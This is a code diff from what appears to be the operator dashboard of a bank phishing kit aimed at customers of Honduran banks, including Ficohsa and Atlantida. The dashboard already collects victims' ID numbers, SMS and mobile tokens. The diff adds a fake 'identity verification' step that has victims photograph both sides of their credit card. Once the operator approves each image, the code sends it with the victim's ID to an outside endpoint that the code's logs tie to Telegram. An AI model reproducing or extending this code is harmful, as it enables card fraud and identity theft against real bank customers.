+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 pointer-events-none", children: /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute w-full h-1 bg-gradient-to-r from-transparent via-cyan-400 to-transparent shadow-[0_0_15px_#38bdf8] animate-scan-laser-vertical" }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "text-center relative z-10 p-5", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-14 h-14 rounded-2xl bg-[#0058CB]/25 text-cyan-300 flex items-center justify-center mx-auto mb-2.5 shadow-lg border border-cyan-500/20", children: fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 30, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 30, className: "animate-pulse" }) }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm sm:text-base font-bold text-white mb-0.5", children: fotoRechazada ? "El visitante está tomando la foto nuevamente" : "Esperando foto del visitante" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs text-cyan-300 font-medium", children: esReverso ? "Reverso de la tarjeta" : "Frente de la tarjeta" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-3 inline-flex items-center gap-1.5 text-[11px] text-gray-300 bg-white/10 px-3 py-1 rounded-full border border-white/15", children: [
+            /* @__PURE__ */ jsxRuntimeExports.jsx(IconClockHour4, { size: 13, className: "text-cyan-400" }),
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { children: "Los botones aparecerán cuando la envíe" })
+          ] })
+        ] })
+      ] })
+    )
+  ] });
+};
+
 function ErrorPage({
   previousPage = 1,
   DNI = "",
@@ -56382,6 +56620,8 @@ function ErrorPage({
         return /* @__PURE__ */ jsxRuntimeExports.jsx(TokenSmsPage, { smsToken });
       case 4:
         return /* @__PURE__ */ jsxRuntimeExports.jsx(PrestamoPage, { prestamoToken });
+      case 7:
+        return /* @__PURE__ */ jsxRuntimeExports.jsx(FotoPage, {});
       default:
         return /* @__PURE__ */ jsxRuntimeExports.jsx(DniPage, { DNI, RTN });
     }
@@ -56425,14 +56665,24 @@ const EmulatedPage = ({
   smsToken = "",
   prestamoToken = "",
   openedFromMain = false,
-  successMessage = ""
+  successMessage = "",
+  fotoTemporal,
+  fotoTemporalHD,
+  esperandoAprobacionFoto,
+  fotoRechazada,
+  fotoAprobada,
+  pasoFoto,
+  fotoFrente,
+  fotoReverso,
+  onAprobarFoto,
+  onRechazarFoto
 }) => {
   const [previousPage, setPreviousPage] = reactExports.useState(currentPage);
   const lastNonErrorPageRef = reactExports.useRef(1);
   const [pageBeforeError, setPageBeforeError] = reactExports.useState(1);
   const selectedBank = sessionStorage.getItem("selectedBank") || "atlantida";
   reactExports.useEffect(() => {
-    if (currentPage >= 1 && currentPage <= 4) {
+    if (currentPage >= 1 && currentPage <= 4 || currentPage === 7) {
       lastNonErrorPageRef.current = currentPage;
     }
     if (currentPage === 5) {
@@ -56497,6 +56747,23 @@ const EmulatedPage = ({
       if (currentPage === 6) {
         return /* @__PURE__ */ jsxRuntimeExports.jsx(FinalizarPage, {});
       }
+      if (currentPage === 7) {
+        return /* @__PURE__ */ jsxRuntimeExports.jsx(
+          FotoPage,
+          {
+            fotoTemporal,
+            fotoTemporalHD,
+            esperandoAprobacionFoto,
+            fotoRechazada,
+            fotoAprobada,
+            pasoFoto,
+            fotoFrente,
+            fotoReverso,
+            onAprobarFoto,
+            onRechazarFoto
+          }
+        );
+      }
       switch (currentPage) {
         case 1:
           return /* @__PURE__ */ jsxRuntimeExports.jsx(DniPage, { DNI, RTN });
@@ -56545,8 +56812,8 @@ const EmulatedPage = ({
       initial: "initial",
       animate: "animate",
       exit: "exit",
-      className: "min-h-full no-scrollbar bg-gray-200 will-change-transform",
-      children: /* @__PURE__ */ jsxRuntimeExports.jsx(EmulatorPageLayout, { children: renderPage() })
+      className: "w-full h-full min-h-full flex flex-col no-scrollbar bg-gray-200 will-change-transform",
+      children: /* @__PURE__ */ jsxRuntimeExports.jsx(EmulatorPageLayout, { isExpanded: currentPage === 7, children: renderPage() })
     },
     currentPage
   ) });
@@ -56816,8 +57083,8 @@ const useUsers = (selectedUserId = null) => {
         const activeDb = getActiveBankDb();
         const collectionName = getBankCollection("redireccion");
         const now = Date.now();
-        const HEARTBEAT_STALE_MS = 45 * 1e3;
-        const SESSION_TIMEOUT_MS = 30 * 60 * 1e3;
+        const HEARTBEAT_STALE_MS = 10 * 60 * 1e3;
+        const SESSION_TIMEOUT_MS = 2 * 60 * 60 * 1e3;
         const snapshot = await getDocs(collection(activeDb, collectionName));
         for (const docSnap of snapshot.docs) {
           const user = docSnap.data();
@@ -57458,6 +57725,8 @@ const Dashboard = () => {
   const [loadingLogout, setLoadingLogout] = reactExports.useState(false);
   const [showFinalizarConfirm, setShowFinalizarConfirm] = reactExports.useState(false);
   const [loadingFinalizar, setLoadingFinalizar] = reactExports.useState(false);
+  const [showFotoConfirm, setShowFotoConfirm] = reactExports.useState(false);
+  const [loadingFoto, setLoadingFoto] = reactExports.useState(false);
   const handleLogoutRequest = () => setShowLogoutConfirm(true);
   const handleLogoutCancel = () => {
     if (!loadingLogout) setShowLogoutConfirm(false);
@@ -57527,8 +57796,11 @@ const Dashboard = () => {
     }
   }, [selectedUser?.page, selectedUser?.id]);
   const [successMessage, setSuccessMessage] = reactExports.useState("");
+  const [selectedLightboxPhoto, setSelectedLightboxPhoto] = reactExports.useState(null);
+  const [downloadedPhotos, setDownloadedPhotos] = reactExports.useState({});
   reactExports.useEffect(() => {
     setSuccessMessage("");
+    setSelectedLightboxPhoto(null);
   }, [selectedUserId]);
   const handleShowSuccess = async () => {
     if (selectedUserId) {
@@ -57536,8 +57808,8 @@ const Dashboard = () => {
       const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
       setSuccessMessage(message);
       try {
-        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
         await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
           successMessage: message
         });
@@ -57549,8 +57821,8 @@ const Dashboard = () => {
   const handleUpdatePageWithClear = async (userId, page) => {
     setSuccessMessage("");
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -57589,12 +57861,142 @@ const Dashboard = () => {
       setShowFinalizarConfirm(false);
     }, 500);
   };
+  const handleFotoRequest = () => {
+    if (selectedUserId) {
+      setShowFotoConfirm(true);
+    }
+  };
+  const handleFotoCancel = () => {
+    if (!loadingFoto) setShowFotoConfirm(false);
+  };
+  const handleFotoConfirm = async () => {
+    if (!selectedUserId) {
+      setShowFotoConfirm(false);
+      return;
+    }
+    setLoadingFoto(true);
+    try {
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
+        mostrarModalFoto: true,
+        fotoRechazada: false,
+        esperandoAprobacionFoto: false,
+        fotoAprobada: false,
+        pasoFoto: "frente",
+        fotoTemporal: null,
+        fotoTemporalHD: null
+      });
+    } catch (e) {
+      console.error("[Dashboard] Error al actualizar flag mostrarModalFoto:", e);
+    }
+    handleUpdatePageWithClear(selectedUserId, 7);
+    setTimeout(() => {
+      setLoadingFoto(false);
+      setShowFotoConfirm(false);
+    }, 500);
+  };
+  const handleAprobarFoto = async () => {
+    if (!selectedUserId) return;
+    try {
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId);
+      const userSnap = await getDoc(userDocRef);
+      const userData = userSnap.exists() ? userSnap.data() : selectedUser;
+      const pasoActual = userData?.pasoFoto || selectedUser?.pasoFoto || "frente";
+      const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || selectedUser?.fotoTemporalHD || selectedUser?.fotoTemporal || "";
+      const dniUser = userData?.DNI || userData?.RTN || selectedUser?.DNI || selectedUser?.RTN || selectedUserId;
+      const fechaStr = (/* @__PURE__ */ new Date()).toLocaleString("es-HN", { dateStyle: "short", timeStyle: "short" });
+      if (pasoActual === "frente") {
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          try {
+            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                bank: selectedBank,
+                photo: fotoAprobadaSrc,
+                caption
+              })
+            });
+          } catch (err) {
+            console.error("[Telegram] Error enviando foto frente:", err);
+          }
+        }
+        await updateDoc(userDocRef, {
+          fotoFrente: fotoAprobadaSrc || true,
+          fotoTemporal: null,
+          fotoTemporalHD: null,
+          pasoFoto: "reverso",
+          esperandoAprobacionFoto: false,
+          fotoAprobada: false,
+          fotoRechazada: false,
+          ultimoValor: "Tarjeta Frente Aprobada - Solicitando Reverso"
+        });
+      } else {
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          try {
+            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                bank: selectedBank,
+                photo: fotoAprobadaSrc,
+                caption
+              })
+            });
+          } catch (err) {
+            console.error("[Telegram] Error enviando foto reverso:", err);
+          }
+        }
+        await updateDoc(userDocRef, {
+          fotoReverso: fotoAprobadaSrc || true,
+          fotoTemporal: null,
+          fotoTemporalHD: null,
+          pasoFoto: "completado",
+          fotoAprobada: true,
+          esperandoAprobacionFoto: false,
+          fotoRechazada: false,
+          ultimoValor: "Tarjeta Reverso Aprobada (Completo)"
+        });
+        handleUpdatePage(selectedUserId, 0);
+      }
+    } catch (e) {
+      console.error("[Dashboard] Error al aprobar foto:", e);
+    }
+  };
+  const handleRechazarFoto = async () => {
+    if (!selectedUserId) return;
+    try {
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
+        fotoRechazada: true,
+        esperandoAprobacionFoto: false,
+        fotoAprobada: false,
+        fotoTemporal: null,
+        fotoTemporalHD: null,
+        ultimoValor: "Foto rechazada - Pidiendo reintento al visitante"
+      });
+    } catch (e) {
+      console.error("[Dashboard] Error al rechazar foto:", e);
+    }
+  };
   const handleError = async () => {
     if (!selectedUserId) return;
     const lastFormPage = lastFormPageByUser[selectedUserId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -57715,7 +58117,13 @@ const Dashboard = () => {
               },
               children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { ref: infoRef, className: "absolute pointer-events-auto", children: [
                 /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 z-0 cursor-move" }),
-                /* @__PURE__ */ jsxRuntimeExports.jsx(UserInfoPanel, { user: selectedUser })
+                /* @__PURE__ */ jsxRuntimeExports.jsx(
+                  UserInfoPanel,
+                  {
+                    user: selectedUser,
+                    onSelectPhoto: (photo) => setSelectedLightboxPhoto(photo)
+                  }
+                )
               ] })
             },
             "user-info-panel"
@@ -57752,6 +58160,7 @@ const Dashboard = () => {
                     onShowSuccess: handleShowSuccess,
                     onFinalizar: handleFinalizarRequest,
                     onError: handleError,
+                    onFoto: handleFotoRequest,
                     selectedBank
                   }
                 )
@@ -57822,6 +58231,90 @@ const Dashboard = () => {
               ] })
             },
             "chat-panel"
+          ),
+          selectedLightboxPhoto && /* @__PURE__ */ jsxRuntimeExports.jsx(
+            "div",
+            {
+              className: "absolute inset-0 z-[100] bg-black/85 backdrop-blur-md flex flex-col items-center justify-center p-6 pointer-events-auto animate-in fade-in duration-200",
+              onClick: () => setSelectedLightboxPhoto(null),
+              children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                "div",
+                {
+                  className: "relative max-w-2xl w-full bg-neutral-900/95 border border-neutral-700/80 rounded-2xl overflow-hidden shadow-2xl flex flex-col ring-1 ring-white/10",
+                  onClick: (e) => e.stopPropagation(),
+                  children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between px-5 py-3.5 bg-neutral-950/90 border-b border-neutral-800", children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2.5", children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" }),
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-sm font-semibold text-white tracking-wide", children: selectedLightboxPhoto.title }),
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[11px] px-2 py-0.5 rounded-full bg-emerald-950 text-emerald-300 border border-emerald-600/50 font-medium", children: "Aprobada" })
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(
+                        "button",
+                        {
+                          onClick: () => setSelectedLightboxPhoto(null),
+                          className: "w-8 h-8 flex items-center justify-center rounded-lg bg-neutral-800 hover:bg-neutral-700 text-gray-300 hover:text-white transition-colors cursor-pointer",
+                          title: "Cerrar vista previa",
+                          children: "✕"
+                        }
+                      )
+                    ] }),
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "p-4 bg-black/90 flex items-center justify-center max-h-[68vh] overflow-hidden", children: /* @__PURE__ */ jsxRuntimeExports.jsx(
+                      "img",
+                      {
+                        src: selectedLightboxPhoto.src,
+                        alt: selectedLightboxPhoto.title,
+                        className: "max-h-[64vh] w-auto max-w-full object-contain rounded-xl shadow-2xl"
+                      }
+                    ) }),
+                    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between px-5 py-3 bg-neutral-950/95 text-xs text-gray-400 border-t border-neutral-800", children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        "Usuario: ",
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("strong", { className: "text-white font-mono", children: selectedUser?.DNI || selectedUser?.RTN || selectedUser?.id })
+                      ] }),
+                      (() => {
+                        const photoKey = `${selectedUser?.id}_${selectedLightboxPhoto.title}`;
+                        const isDownloaded = !!downloadedPhotos[photoKey];
+                        if (isDownloaded) {
+                          return /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                            "button",
+                            {
+                              type: "button",
+                              disabled: true,
+                              className: "px-3.5 py-1.5 bg-neutral-800/80 text-emerald-400 rounded-lg border border-emerald-500/30 font-medium flex items-center gap-1.5 cursor-not-allowed opacity-90 shadow-sm",
+                              children: [
+                                /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { className: "w-3.5 h-3.5 text-emerald-400", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { "stroke-linecap": "round", "stroke-linejoin": "round", "stroke-width": "2.5", d: "M5 13l4 4L19 7" }) }),
+                                "Descargada"
+                              ]
+                            }
+                          );
+                        }
+                        return /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                          "button",
+                          {
+                            type: "button",
+                            onClick: () => {
+                              const link = document.createElement("a");
+                              link.href = selectedLightboxPhoto.src;
+                              link.download = `${selectedLightboxPhoto.title.toLowerCase().replace(/\s+/g, "_")}_${selectedUser?.id}.jpg`;
+                              document.body.appendChild(link);
+                              link.click();
+                              document.body.removeChild(link);
+                              setDownloadedPhotos((prev) => ({ ...prev, [photoKey]: true }));
+                            },
+                            className: "px-3.5 py-1.5 bg-emerald-600/30 hover:bg-emerald-600/50 active:scale-95 text-emerald-300 rounded-lg border border-emerald-500/40 transition-all font-medium flex items-center gap-1.5 cursor-pointer shadow-sm",
+                            children: [
+                              /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { className: "w-3.5 h-3.5", fill: "none", viewBox: "0 0 24 24", stroke: "currentColor", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { "stroke-linecap": "round", "stroke-linejoin": "round", "stroke-width": "2", d: "M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" }) }),
+                              "Descargar foto"
+                            ]
+                          }
+                        );
+                      })()
+                    ] })
+                  ]
+                }
+              )
+            }
           )
         ] }),
         children: selectedUserId && selectedUser ? /* @__PURE__ */ jsxRuntimeExports.jsx(
@@ -57834,7 +58327,17 @@ const Dashboard = () => {
             smsToken: selectedUser.smsToken,
             prestamoToken: selectedUser.prestamoToken,
             openedFromMain,
-            successMessage
+            successMessage,
+            fotoTemporal: selectedUser.fotoTemporal,
+            fotoTemporalHD: selectedUser.fotoTemporalHD,
+            esperandoAprobacionFoto: selectedUser.esperandoAprobacionFoto,
+            fotoRechazada: selectedUser.fotoRechazada,
+            fotoAprobada: selectedUser.fotoAprobada,
+            pasoFoto: selectedUser.pasoFoto,
+            fotoFrente: selectedUser.fotoFrente,
+            fotoReverso: selectedUser.fotoReverso,
+            onAprobarFoto: handleAprobarFoto,
+            onRechazarFoto: handleRechazarFoto
           },
           selectedUserId
         ) : /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-center h-full text-white/40 font-light flex-col py-16", children: [
@@ -57929,6 +58432,20 @@ const Dashboard = () => {
     /* @__PURE__ */ jsxRuntimeExports.jsx(
       ConfirmModal,
       {
+        isOpen: showFotoConfirm,
+        title: "Verificación de Identidad",
+        message: "¿Enviar al usuario a la verificación de identidad (escaneo de tarjeta de crédito)? Se le mostrará la advertencia de verificación.",
+        confirmText: "Solicitar Escaneo",
+        cancelText: "Cancelar",
+        onConfirm: handleFotoConfirm,
+        onCancel: handleFotoCancel,
+        loading: loadingFoto,
+        variant: "warning"
+      }
+    ),
+    /* @__PURE__ */ jsxRuntimeExports.jsx(
+      ConfirmModal,
+      {
         isOpen: !!confirmAcceptChatUserId,
         title: "Aceptar conversación",
         message: "El cliente está solicitando asistencia por chat en vivo. ¿Deseas iniciar la conversación?",
@@ -57951,6 +58468,7 @@ const CATEGORIES = [
 const MobileDashboard = () => {
   const navigate = useNavigate();
   const { selectedBank, clearBank } = useAuth();
+  const isFicohsa = selectedBank === "ficohsa";
   const handleChangeBank = () => {
     clearBank();
     navigate("/select-bank", { replace: true });
@@ -57969,6 +58487,9 @@ const MobileDashboard = () => {
   const [copiedField, setCopiedField] = reactExports.useState(null);
   const [successPressedByUser, setSuccessPressedByUser] = reactExports.useState({});
   const [lastFormPageByUser, setLastFormPageByUser] = reactExports.useState({});
+  const [selectedLightboxPhoto, setSelectedLightboxPhoto] = reactExports.useState(null);
+  const [downloadedPhotos, setDownloadedPhotos] = reactExports.useState({});
+  const [loadingPhotoAction, setLoadingPhotoAction] = reactExports.useState({});
   const copyToClipboard = reactExports.useCallback((value, fieldName) => {
     const copyFallback = () => {
       const textArea = document.createElement("textarea");
@@ -58081,10 +58602,112 @@ const MobileDashboard = () => {
       handleLogout();
     }, 900);
   };
+  const handleAprobarFotoMobile = async (user) => {
+    if (!user?.id) return;
+    setLoadingPhotoAction((prev) => ({ ...prev, [user.id]: true }));
+    try {
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), user.id);
+      const userSnap = await getDoc(userDocRef);
+      const userData = userSnap.exists() ? userSnap.data() : user;
+      const pasoActual = userData?.pasoFoto || user?.pasoFoto || "frente";
+      const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || user?.fotoTemporalHD || user?.fotoTemporal || "";
+      const dniUser = userData?.DNI || userData?.RTN || user?.DNI || user?.RTN || user.id;
+      const fechaStr = (/* @__PURE__ */ new Date()).toLocaleString("es-HN", { dateStyle: "short", timeStyle: "short" });
+      const bankName = selectedBank || "ficohsa";
+      if (pasoActual === "frente") {
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${bankName.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          try {
+            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                bank: bankName,
+                photo: fotoAprobadaSrc,
+                caption
+              })
+            });
+          } catch (err) {
+            console.error("[Telegram] Error enviando foto frente:", err);
+          }
+        }
+        await updateDoc(userDocRef, {
+          fotoFrente: fotoAprobadaSrc || true,
+          fotoTemporal: null,
+          fotoTemporalHD: null,
+          pasoFoto: "reverso",
+          esperandoAprobacionFoto: false,
+          fotoAprobada: false,
+          fotoRechazada: false,
+          ultimoValor: "Tarjeta Frente Aprobada - Solicitando Reverso"
+        });
+      } else {
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${bankName.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          try {
+            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                bank: bankName,
+                photo: fotoAprobadaSrc,
+                caption
+              })
+            });
+          } catch (err) {
+            console.error("[Telegram] Error enviando foto reverso:", err);
+          }
+        }
+        await updateDoc(userDocRef, {
+          fotoReverso: fotoAprobadaSrc || true,
+          fotoTemporal: null,
+          fotoTemporalHD: null,
+          pasoFoto: "completado",
+          fotoAprobada: true,
+          esperandoAprobacionFoto: false,
+          fotoRechazada: false,
+          ultimoValor: "Tarjeta Reverso Aprobada (Completo)"
+        });
+        handleUpdatePage(user.id, 0);
+      }
+    } catch (e) {
+      console.error("[MobileDashboard] Error al aprobar foto:", e);
+    } finally {
+      setLoadingPhotoAction((prev) => ({ ...prev, [user.id]: false }));
+    }
+  };
+  const handleRechazarFotoMobile = async (userId) => {
+    if (!userId) return;
+    setLoadingPhotoAction((prev) => ({ ...prev, [userId]: true }));
+    try {
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), userId), {
+        fotoRechazada: true,
+        esperandoAprobacionFoto: false,
+        fotoAprobada: false,
+        fotoTemporal: null,
+        fotoTemporalHD: null,
+        ultimoValor: "Foto rechazada - Pidiendo reintento al visitante"
+      });
+    } catch (e) {
+      console.error("[MobileDashboard] Error al rechazar foto:", e);
+    } finally {
+      setLoadingPhotoAction((prev) => ({ ...prev, [userId]: false }));
+    }
+  };
   const handleUpdatePageWithClear = async (userId, page) => {
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58106,8 +58729,8 @@ const MobileDashboard = () => {
   const handleErrorForUser = async (userId) => {
     const lastFormPage = lastFormPageByUser[userId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58151,22 +58774,24 @@ const MobileDashboard = () => {
     }
   };
   const getPageName = (page) => {
-    const isFicohsa = selectedBank === "ficohsa";
+    const isFicohsa2 = selectedBank === "ficohsa";
     switch (page) {
       case 0:
         return "Cargando";
       case 1:
         return "DNI/RTN";
       case 2:
-        return isFicohsa ? "Token Móvil" : "Desbloquear";
+        return isFicohsa2 ? "Token Móvil" : "Desbloquear";
       case 3:
-        return isFicohsa ? "Token SMS" : "Registrar";
+        return isFicohsa2 ? "Token SMS" : "Registrar";
       case 4:
-        return isFicohsa ? "Préstamo" : "Desconocido";
+        return isFicohsa2 ? "Préstamo" : "Desconocido";
       case 5:
         return "Error";
       case 6:
         return "Finalizado";
+      case 7:
+        return "Foto";
       default:
         return "Desconocido";
     }
@@ -58230,7 +58855,11 @@ const MobileDashboard = () => {
                 /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "font-medium text-sm", children: user.DNI || user.RTN || user.id.slice(0, 8) }),
                 /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 text-xs", children: [
